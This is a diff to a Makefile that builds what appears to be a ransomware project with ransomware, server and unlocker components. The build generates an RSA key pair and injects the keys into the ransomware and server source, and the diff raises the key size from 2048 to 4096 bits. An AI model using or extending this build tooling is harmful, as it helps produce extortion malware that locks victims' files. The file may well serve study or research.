@@ -9,7 +9,7 @@ pre-build:
 	mkdir -p $(BUILD_DIR)/ransomware
 	mkdir -p $(BUILD_DIR)/server
 	mkdir -p $(BUILD_DIR)/unlocker
-	openssl genrsa -out $(BUILD_DIR)/server/private.pem 2048
+	openssl genrsa -out $(BUILD_DIR)/server/private.pem 4096
 	openssl rsa -in $(BUILD_DIR)/server/private.pem -outform PEM -pubout -out $(BUILD_DIR)/ransomware/public.pem
 	rsrc -manifest ransomware.manifest -ico icon.ico -o $(BUILD_DIR)/ransomware/ransomware.syso
 	cp $(BUILD_DIR)/ransomware/ransomware.syso $(BUILD_DIR)/unlocker/unlocker.syso
@@ -18,7 +18,7 @@ pre-build:
 	cp -r cmd/unlocker $(BUILD_DIR)
 	cd $(BUILD_DIR)/ransomware && perl -pi -e 's/INJECT_PUB_KEY_HERE/`echo -n "\n"; cat public.pem`/e' ransomware.go
 	cd $(BUILD_DIR)/server && perl -pi -e 's/INJECT_PRIV_KEY_HERE/`echo -n "\n"; cat private.pem`/e' main.go
-	cd $(BUILD_DIR)/server && go run $$GOROOT/src/crypto/tls/generate_cert.go --host localhost
+	cd $(BUILD_DIR)/server && env GOOS=linux go run $$GOROOT/src/crypto/tls/generate_cert.go --host localhost
 	mkdir -p $(BIN_DIR)
 	mkdir -p $(BIN_DIR)/server
 
